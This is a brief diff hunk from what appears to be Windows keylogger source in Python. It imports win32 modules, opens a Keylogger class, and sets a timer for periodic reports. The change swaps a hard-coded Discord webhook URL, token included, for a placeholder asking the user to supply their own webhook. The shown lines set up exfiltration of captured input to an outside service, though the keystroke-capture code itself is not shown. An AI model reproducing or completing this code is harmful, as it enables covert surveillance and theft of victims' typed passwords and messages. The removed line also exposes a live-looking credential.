@@ -36,7 +36,7 @@ import win32con
 import win32api
 import win32console
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1114116826872426537/FCU_xPsLZYTV60DEvsDmQTDzE5_Z98hL4AoYGtw7eQj5wz70uzsydIc2QJwb8wGu4SNx'
+WEBHOOK_URL = 'Enter your Discord webhook URL here before running'
 TIME_INTERVAL = 60  # Amount of time between each report, expressed in seconds
 
 class Keylogger:
